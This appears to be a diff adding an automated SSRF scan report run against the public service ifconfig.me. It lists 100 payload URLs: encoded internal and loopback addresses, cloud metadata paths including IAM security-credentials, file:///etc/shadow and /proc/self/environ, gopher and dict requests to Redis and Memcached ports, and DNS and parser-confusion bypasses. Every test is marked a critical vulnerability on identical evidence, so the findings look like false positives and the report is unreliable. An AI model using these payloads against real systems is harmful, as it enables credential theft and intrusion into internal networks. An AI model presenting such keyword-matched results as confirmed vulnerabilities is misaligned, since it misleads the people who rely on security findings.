@@ -1,0 +1,659 @@
+================================================================================
+🎯 ENHANCED SSRF EXPLOITATION REPORT
+================================================================================
+
+📋 SCAN INFORMATION:
+----------------------------------------
+Target URL: https://ifconfig.me
+Scan Time: 2025-11-24 18:18:04
+Total Tests: 100
+Vulnerabilities Found: 100
+Risk Level: CRITICAL
+
+📊 EXECUTIVE SUMMARY:
+----------------------------------------
+Overall Risk: CRITICAL
+Total Vulnerabilities: 100
+Success Rate: 100.0%
+
+🚨 CRITICAL VULNERABILITIES FOUND:
+----------------------------------------
+1. RFC1918_Class_A_hexadecimal_10.0.0.1_to_0x0a000001
+   URL: http://0x0a000001/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_RFC1918_Class_A_hexadecimal_10.0.0.1_to_0x0a000001_20251124_181734.html
+
+2. RFC1918_Class_A_decimal_10.0.0.1_to_167772161
+   URL: http://167772161/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_RFC1918_Class_A_decimal_10.0.0.1_to_167772161_20251124_181734.html
+
+3. RFC1918_Class_A_dotted_octal_10.0.0.1_to_012.00.00.01
+   URL: http://012.00.00.01/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_RFC1918_Class_A_dotted_octal_10.0.0.1_to_012.00.00.01_20251124_181734.html
+
+4. RFC1918_Class_A_mixed_hex_dec_10.0.0.1_to_0x0a.0.0x00.1
+   URL: http://0x0a.0.0x00.1/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_RFC1918_Class_A_mixed_hex_dec_10.0.0.1_to_0x0a.0.0x00.1_20251124_181734.html
+
+5. RFC1918_Class_A_dotted_hex_10.0.0.1_to_0x0a.0x00.0x00.0x01
+   URL: http://0x0a.0x00.0x00.0x01/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_RFC1918_Class_A_dotted_hex_10.0.0.1_to_0x0a.0x00.0x00.0x01_20251124_181735.html
+
+6. RFC1918_Class_A_decimal_leading_zeros_10.0.0.1_to_0167772161
+   URL: http://0167772161/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_RFC1918_Class_A_decimal_leading_zeros_10.0.0.1_to_0167772161_20251124_181736.html
+
+7. RFC1918_Class_A_mixed_oct_dec_10.0.0.1_to_012.0.00.1
+   URL: http://012.0.00.1/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_RFC1918_Class_A_mixed_oct_dec_10.0.0.1_to_012.0.00.1_20251124_181736.html
+
+8. RFC1918_Class_B_hexadecimal_172.16.0.1_to_0xac100001
+   URL: http://0xac100001/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_RFC1918_Class_B_hexadecimal_172.16.0.1_to_0xac100001_20251124_181736.html
+
+9. RFC1918_Class_B_decimal_172.16.0.1_to_2886729729
+   URL: http://2886729729/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_RFC1918_Class_B_decimal_172.16.0.1_to_2886729729_20251124_181736.html
+
+10. RFC1918_Class_B_dotted_hex_172.16.0.1_to_0xac.0x10.0x00.0x01
+   URL: http://0xac.0x10.0x00.0x01/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_RFC1918_Class_B_dotted_hex_172.16.0.1_to_0xac.0x10.0x00.0x01_20251124_181737.html
+
+11. RFC1918_Class_B_dotted_octal_172.16.0.1_to_0254.020.00.01
+   URL: http://0254.020.00.01/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_RFC1918_Class_B_dotted_octal_172.16.0.1_to_0254.020.00.01_20251124_181737.html
+
+12. RFC1918_Class_B_mixed_hex_dec_172.16.0.1_to_0xac.16.0x00.1
+   URL: http://0xac.16.0x00.1/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_RFC1918_Class_B_mixed_hex_dec_172.16.0.1_to_0xac.16.0x00.1_20251124_181737.html
+
+13. RFC1918_Class_B_mixed_oct_dec_172.16.0.1_to_0254.16.00.1
+   URL: http://0254.16.00.1/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_RFC1918_Class_B_mixed_oct_dec_172.16.0.1_to_0254.16.00.1_20251124_181737.html
+
+14. RFC1918_Class_B_decimal_leading_zeros_172.16.0.1_to_2886729729
+   URL: http://2886729729/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_RFC1918_Class_B_decimal_leading_zeros_172.16.0.1_to_2886729729_20251124_181737.html
+
+15. RFC1918_Class_C_decimal_192.168.1.1_to_3232235777
+   URL: http://3232235777/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_RFC1918_Class_C_decimal_192.168.1.1_to_3232235777_20251124_181737.html
+
+16. RFC1918_Class_C_hexadecimal_192.168.1.1_to_0xc0a80101
+   URL: http://0xc0a80101/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_RFC1918_Class_C_hexadecimal_192.168.1.1_to_0xc0a80101_20251124_181738.html
+
+17. RFC1918_Class_C_dotted_hex_192.168.1.1_to_0xc0.0xa8.0x01.0x01
+   URL: http://0xc0.0xa8.0x01.0x01/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_RFC1918_Class_C_dotted_hex_192.168.1.1_to_0xc0.0xa8.0x01.0x01_20251124_181738.html
+
+18. RFC1918_Class_C_dotted_octal_192.168.1.1_to_0300.0250.01.01
+   URL: http://0300.0250.01.01/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_RFC1918_Class_C_dotted_octal_192.168.1.1_to_0300.0250.01.01_20251124_181738.html
+
+19. RFC1918_Class_C_mixed_hex_dec_192.168.1.1_to_0xc0.168.0x01.1
+   URL: http://0xc0.168.0x01.1/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_RFC1918_Class_C_mixed_hex_dec_192.168.1.1_to_0xc0.168.0x01.1_20251124_181738.html
+
+20. RFC1918_Class_C_mixed_oct_dec_192.168.1.1_to_0300.168.01.1
+   URL: http://0300.168.01.1/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_RFC1918_Class_C_mixed_oct_dec_192.168.1.1_to_0300.168.01.1_20251124_181739.html
+
+21. RFC1918_Class_C_decimal_leading_zeros_192.168.1.1_to_3232235777
+   URL: http://3232235777/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_RFC1918_Class_C_decimal_leading_zeros_192.168.1.1_to_3232235777_20251124_181739.html
+
+22. Loopback_decimal_127.0.0.1_to_2130706433
+   URL: http://2130706433/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Loopback_decimal_127.0.0.1_to_2130706433_20251124_181739.html
+
+23. Loopback_hexadecimal_127.0.0.1_to_0x7f000001
+   URL: http://0x7f000001/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Loopback_hexadecimal_127.0.0.1_to_0x7f000001_20251124_181739.html
+
+24. Loopback_dotted_hex_127.0.0.1_to_0x7f.0x00.0x00.0x01
+   URL: http://0x7f.0x00.0x00.0x01/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Loopback_dotted_hex_127.0.0.1_to_0x7f.0x00.0x00.0x01_20251124_181739.html
+
+25. Loopback_dotted_octal_127.0.0.1_to_0177.00.00.01
+   URL: http://0177.00.00.01/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Loopback_dotted_octal_127.0.0.1_to_0177.00.00.01_20251124_181740.html
+
+26. Loopback_mixed_hex_dec_127.0.0.1_to_0x7f.0.0x00.1
+   URL: http://0x7f.0.0x00.1/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Loopback_mixed_hex_dec_127.0.0.1_to_0x7f.0.0x00.1_20251124_181740.html
+
+27. Loopback_mixed_oct_dec_127.0.0.1_to_0177.0.00.1
+   URL: http://0177.0.00.1/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Loopback_mixed_oct_dec_127.0.0.1_to_0177.0.00.1_20251124_181740.html
+
+28. AWS_Metadata_decimal_169.254.169.254_to_2852039166
+   URL: http://2852039166/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_AWS_Metadata_decimal_169.254.169.254_to_2852039166_20251124_181740.html
+
+29. Loopback_decimal_leading_zeros_127.0.0.1_to_2130706433
+   URL: http://2130706433/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Loopback_decimal_leading_zeros_127.0.0.1_to_2130706433_20251124_181740.html
+
+30. AWS_Metadata_hexadecimal_169.254.169.254_to_0xa9fea9fe
+   URL: http://0xa9fea9fe/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_AWS_Metadata_hexadecimal_169.254.169.254_to_0xa9fea9fe_20251124_181741.html
+
+31. AWS_Metadata_dotted_hex_169.254.169.254_to_0xa9.0xfe.0xa9.0xfe
+   URL: http://0xa9.0xfe.0xa9.0xfe/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_AWS_Metadata_dotted_hex_169.254.169.254_to_0xa9.0xfe.0xa9.0xfe_20251124_181741.html
+
+32. AWS_Metadata_dotted_octal_169.254.169.254_to_0251.0376.0251.0376
+   URL: http://0251.0376.0251.0376/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_AWS_Metadata_dotted_octal_169.254.169.254_to_0251.0376.0251.0376_20251124_181741.html
+
+33. AWS_Metadata_mixed_hex_dec_169.254.169.254_to_0xa9.254.0xa9.254
+   URL: http://0xa9.254.0xa9.254/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_AWS_Metadata_mixed_hex_dec_169.254.169.254_to_0xa9.254.0xa9.254_20251124_181741.html
+
+34. AWS_Metadata_mixed_oct_dec_169.254.169.254_to_0251.254.0251.254
+   URL: http://0251.254.0251.254/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_AWS_Metadata_mixed_oct_dec_169.254.169.254_to_0251.254.0251.254_20251124_181741.html
+
+35. AWS_Metadata_decimal_leading_zeros_169.254.169.254_to_2852039166
+   URL: http://2852039166/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_AWS_Metadata_decimal_leading_zeros_169.254.169.254_to_2852039166_20251124_181741.html
+
+36. All_zeros_decimal_0.0.0.0_to_0
+   URL: http://0/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_All_zeros_decimal_0.0.0.0_to_0_20251124_181742.html
+
+37. All_zeros_hexadecimal_0.0.0.0_to_0x00000000
+   URL: http://0x00000000/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_All_zeros_hexadecimal_0.0.0.0_to_0x00000000_20251124_181742.html
+
+38. All_zeros_dotted_hex_0.0.0.0_to_0x00.0x00.0x00.0x00
+   URL: http://0x00.0x00.0x00.0x00/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_All_zeros_dotted_hex_0.0.0.0_to_0x00.0x00.0x00.0x00_20251124_181742.html
+
+39. All_zeros_dotted_octal_0.0.0.0_to_00.00.00.00
+   URL: http://00.00.00.00/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_All_zeros_dotted_octal_0.0.0.0_to_00.00.00.00_20251124_181742.html
+
+40. All_zeros_mixed_hex_dec_0.0.0.0_to_0x00.0.0x00.0
+   URL: http://0x00.0.0x00.0/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_All_zeros_mixed_hex_dec_0.0.0.0_to_0x00.0.0x00.0_20251124_181743.html
+
+41. All_zeros_mixed_oct_dec_0.0.0.0_to_00.0.00.0
+   URL: http://00.0.00.0/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_All_zeros_mixed_oct_dec_0.0.0.0_to_00.0.00.0_20251124_181743.html
+
+42. All_zeros_decimal_leading_zeros_0.0.0.0_to_0000000000
+   URL: http://0000000000/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_All_zeros_decimal_leading_zeros_0.0.0.0_to_0000000000_20251124_181743.html
+
+43. IPv6_Loopback_::1
+   URL: http://[::1]/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_IPv6_Loopback___1_20251124_181743.html
+
+44. IPv6_Unique_Local_fc00::1
+   URL: http://[fc00::1]/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_IPv6_Unique_Local_fc00__1_20251124_181743.html
+
+45. IPv6_Link_Local_fe80::1
+   URL: http://[fe80::1]/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_IPv6_Link_Local_fe80__1_20251124_181744.html
+
+46. Localhost_dotted_hex
+   URL: http://0x7f.0.0.1/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Localhost_dotted_hex_20251124_181744.html
+
+47. Localhost_dotted_octal
+   URL: http://0177.0.0.1/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Localhost_dotted_octal_20251124_181744.html
+
+48. Localhost_decimal
+   URL: http://2130706433/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Localhost_decimal_20251124_181744.html
+
+49. Localhost_hex
+   URL: http://0x7f000001/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Localhost_hex_20251124_181744.html
+
+50. Localhost_shortened
+   URL: http://127.1/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Localhost_shortened_20251124_181745.html
+
+51. AWS_Metadata_hex
+   URL: http://0xa9fea9fe/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_AWS_Metadata_hex_20251124_181745.html
+
+52. Localhost_alternative
+   URL: http://127.0.1/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Localhost_alternative_20251124_181745.html
+
+53. AWS_Metadata_decimal
+   URL: http://2852039166/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_AWS_Metadata_decimal_20251124_181745.html
+
+54. AWS_Metadata_dotted_hex
+   URL: http://0xa9.0xfe.0xa9.0xfe/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_AWS_Metadata_dotted_hex_20251124_181746.html
+
+55. Localhost_access_http_localhost_
+   URL: http://localhost/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Localhost_access_http_localhost__20251124_181748.html
+
+56. Localhost_access_http_127.0.0.1_
+   URL: http://127.0.0.1/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Localhost_access_http_127.0.0.1__20251124_181748.html
+
+57. Localhost_access_http_[__1]_
+   URL: http://[::1]/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Localhost_access_http_[__1]__20251124_181748.html
+
+58. Localhost_access_http_0.0.0.0_
+   URL: http://0.0.0.0/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Localhost_access_http_0.0.0.0__20251124_181748.html
+
+59. Localhost_access_http_127.0.0.1_80_
+   URL: http://127.0.0.1:80/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Localhost_access_http_127.0.0.1_80__20251124_181748.html
+
+60. Localhost_access_http_localhost_8080_
+   URL: http://localhost:8080/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Localhost_access_http_localhost_8080__20251124_181749.html
+
+61. Localhost_access_http_127.0.1_
+   URL: http://127.0.1/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Localhost_access_http_127.0.1__20251124_181749.html
+
+62. Localhost_access_http_0x7f.0.0.1_
+   URL: http://0x7f.0.0.1/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Localhost_access_http_0x7f.0.0.1__20251124_181749.html
+
+63. Localhost_access_http_127.1_
+   URL: http://127.1/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Localhost_access_http_127.1__20251124_181749.html
+
+64. Localhost_access_http_0177.0.0.1_
+   URL: http://0177.0.0.1/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Localhost_access_http_0177.0.0.1__20251124_181749.html
+
+65. Localhost_access_http_2130706433_
+   URL: http://2130706433/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Localhost_access_http_2130706433__20251124_181750.html
+
+66. Localhost_access_http_0x7f000001_
+   URL: http://0x7f000001/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Localhost_access_http_0x7f000001__20251124_181750.html
+
+67. Router_hex_encoding
+   URL: http://0xc0a80101/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Router_hex_encoding_20251124_181750.html
+
+68. Router_admin_interface
+   URL: http://192.168.1.1/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Router_admin_interface_20251124_181750.html
+
+69. Router_decimal_encoding
+   URL: http://3232235777/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Router_decimal_encoding_20251124_181750.html
+
+70. Internal_network_gateway
+   URL: http://10.0.0.1/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Internal_network_gateway_20251124_181751.html
+
+71. Internal_gateway_hex
+   URL: http://0x0a000001/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Internal_gateway_hex_20251124_181751.html
+
+72. Internal_gateway_decimal
+   URL: http://167772161/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Internal_gateway_decimal_20251124_181751.html
+
+73. Corporate_network
+   URL: http://172.16.0.1/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Corporate_network_20251124_181751.html
+
+74. AWS_Metadata_service
+   URL: http://169.254.169.254/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_AWS_Metadata_service_20251124_181751.html
+
+75. AWS_Metadata_hex
+   URL: http://0xa9fea9fe/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_AWS_Metadata_hex_20251124_181752.html
+
+76. AWS_Metadata_decimal
+   URL: http://2852039166/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_AWS_Metadata_decimal_20251124_181752.html
+
+77. AWS_Metadata_http_169.254.169.254_latest_meta-data_iam_security-credentials_
+   URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_AWS_Metadata_http_169.254.169.254_latest_meta-data_iam_security-credentials__20251124_181755.html
+
+78. AWS_Metadata_http_169.254.169.254_latest_user-data_
+   URL: http://169.254.169.254/latest/user-data/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_AWS_Metadata_http_169.254.169.254_latest_user-data__20251124_181755.html
+
+79. AWS_Metadata_http_2852039166_latest_meta-data_
+   URL: http://2852039166/latest/meta-data/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_AWS_Metadata_http_2852039166_latest_meta-data__20251124_181755.html
+
+80. AWS_Metadata_http_0xa9fea9fe_latest_meta-data_
+   URL: http://0xa9fea9fe/latest/meta-data/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_AWS_Metadata_http_0xa9fea9fe_latest_meta-data__20251124_181755.html
+
+81. AWS_Metadata_http_169.254.169.254_latest_meta-data_
+   URL: http://169.254.169.254/latest/meta-data/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_AWS_Metadata_http_169.254.169.254_latest_meta-data__20251124_181755.html
+
+82. AWS_Metadata_http_169.254.169.254_latest_dynamic_instance-identity_document
+   URL: http://169.254.169.254/latest/dynamic/instance-identity/document
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_AWS_Metadata_http_169.254.169.254_latest_dynamic_instance-identity_document_20251124_181756.html
+
+83. Cloud_Metadata_http_metadata.google.internal_computeMetadata_v1_
+   URL: http://metadata.google.internal/computeMetadata/v1/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Cloud_Metadata_http_metadata.google.internal_computeMetadata_v1__20251124_181756.html
+
+84. Cloud_Metadata_http_100.100.100.200_latest_meta-data_
+   URL: http://100.100.100.200/latest/meta-data/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Cloud_Metadata_http_100.100.100.200_latest_meta-data__20251124_181756.html
+
+85. Cloud_Metadata_http_0x646464c8_latest_meta-data_
+   URL: http://0x646464c8/latest/meta-data/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Cloud_Metadata_http_0x646464c8_latest_meta-data__20251124_181756.html
+
+86. File_protocol_file__etc_hosts
+   URL: file:///etc/hosts
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_File_protocol_file__etc_hosts_20251124_181758.html
+
+87. File_protocol_file__proc_self_environ
+   URL: file:///proc/self/environ
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_File_protocol_file__proc_self_environ_20251124_181758.html
+
+88. Dangerous_protocol_gopher_127.0.0.1_6379__INFO
+   URL: gopher://127.0.0.1:6379/_INFO
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Dangerous_protocol_gopher_127.0.0.1_6379__INFO_20251124_181758.html
+
+89. File_protocol_file__etc_shadow
+   URL: file:///etc/shadow
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_File_protocol_file__etc_shadow_20251124_181758.html
+
+90. File_protocol_file__etc_passwd
+   URL: file:///etc/passwd
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_File_protocol_file__etc_passwd_20251124_181758.html
+
+91. Dangerous_protocol_phar__etc_passwd
+   URL: phar:///etc/passwd
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Dangerous_protocol_phar__etc_passwd_20251124_181759.html
+
+92. Dangerous_protocol_dict_127.0.0.1_11211_stats
+   URL: dict://127.0.0.1:11211/stats
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Dangerous_protocol_dict_127.0.0.1_11211_stats_20251124_181759.html
+
+93. DNS_bypass_http_127_0_0_1_nip_io_
+   URL: http://127.0.0.1.nip.io/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_DNS_bypass_http_127_0_0_1_nip_io__20251124_181801.html
+
+94. DNS_bypass_http_0x7f_0_0_1_nip_io_
+   URL: http://0x7f.0.0.1.nip.io/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_DNS_bypass_http_0x7f_0_0_1_nip_io__20251124_181801.html
+
+95. DNS_bypass_http_localhost_localdomain_
+   URL: http://localhost.localdomain/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_DNS_bypass_http_localhost_localdomain__20251124_181801.html
+
+96. DNS_bypass_http_localtest_me_
+   URL: http://localtest.me/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_DNS_bypass_http_localtest_me__20251124_181801.html
+
+97. DNS_bypass_http_2130706433_nip_io_
+   URL: http://2130706433.nip.io/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_DNS_bypass_http_2130706433_nip_io__20251124_181802.html
+
+98. Parser_confusion_http_google.com_at_127.0.0.1_
+   URL: http://google.com@127.0.0.1/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Parser_confusion_http_google.com_at_127.0.0.1__20251124_181802.html
+
+99. Parser_confusion_http_127.0.0.1_at_google.com_
+   URL: http://127.0.0.1@google.com/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Parser_confusion_http_127.0.0.1_at_google.com__20251124_181802.html
+
+100. Parser_confusion_http_0x7f.0.0.1_at_google.com_
+   URL: http://0x7f.0.0.1@google.com/
+   Evidence: Found indicators: api, google, html
+   Status Code: 200
+   Saved File: vuln_Parser_confusion_http_0x7f.0.0.1_at_google.com__20251124_181803.html
+
+🔧 TEST SUITE BREAKDOWN:
+----------------------------------------
+📁 IP Encoding Attacks:
+   Tests: 54
+   Vulnerabilities: 54
+   Success Rate: 100.0%
+
+📁 Internal Service Enumeration:
+   Tests: 22
+   Vulnerabilities: 22
+   Success Rate: 100.0%
+
+📁 Cloud Metadata Access:
+   Tests: 9
+   Vulnerabilities: 9
+   Success Rate: 100.0%
+
+📁 Protocol-Based Attacks:
+   Tests: 7
+   Vulnerabilities: 7
+   Success Rate: 100.0%
+
+📁 Bypass Techniques:
+   Tests: 8
+   Vulnerabilities: 8
+   Success Rate: 100.0%
+
+🛡️ SECURITY RECOMMENDATIONS:
+----------------------------------------
+1. Implement strict URL validation and filtering
+2. Block access to private IP addresses
+3. Restrict allowed protocols to HTTP/HTTPS only
+4. Implement DNS resolution validation
+5. Add request size and timeout limits
+6. Monitor for suspicious outbound requests
+
+================================================================================
+Report generated by Enhanced SSRF Testing Tool
+================================================================================
